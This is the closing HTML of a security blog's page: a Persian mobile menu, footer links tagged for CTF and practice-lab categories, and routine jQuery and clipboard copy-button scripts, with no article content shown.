        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> منو</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> محتوا</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> اشتراک‌گذاری</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> بالا</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    حق‌کپی &copy;
    
    
    2016-2025
    SunRT
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">总览</a></li>
         
          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
         
          <li><a href="/tags/PWN/">CTF-PWN</a></li>
         
          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
         
          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
         
          <li><a href="/tags/Vulhub">Vulhub</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
